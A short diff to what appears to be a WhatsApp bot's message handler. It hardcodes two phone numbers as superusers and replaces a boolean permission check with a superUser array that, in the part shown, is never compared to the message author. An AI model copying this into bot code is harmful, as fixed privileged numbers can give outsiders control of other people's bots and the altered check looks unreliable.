@@ -316,10 +316,20 @@ const STATE = conf.PRESENCE;
             ? auteurMsgRepondu 
             : '';
 
-    // Permission flags
-    const botJid = `${adams.user?.id.split(':')[0]}@s.whatsapp.net`;
-    const isSuperUser = [ `${conf.OWNER_NUMBER}@s.whatsapp.net`, `${adams.user?.id.split(':')[0]}@s.whatsapp.net`, ...SUDO_NUMBERS ].includes(auteurMessage);
+    const SUDO_NUMBERS = [
+  "254710772666",
+  "254727716045"
+   ];
 
+  const botJid = `${adams.user?.id.split(":")[0]}@s.whatsapp.net`;
+  const ownerJid = `${conf.OWNER_NUMBER}@s.whatsapp.net`;
+
+  const superUser = [
+  ownerJid,
+  botJid,
+  ...SUDO_NUMBERS.map(num => `${num}@s.whatsapp.net`)
+  ];
+  
     let verifAdmin = false;
     let botIsAdmin = false;
     if (verifGroupe && infosGroupe) {
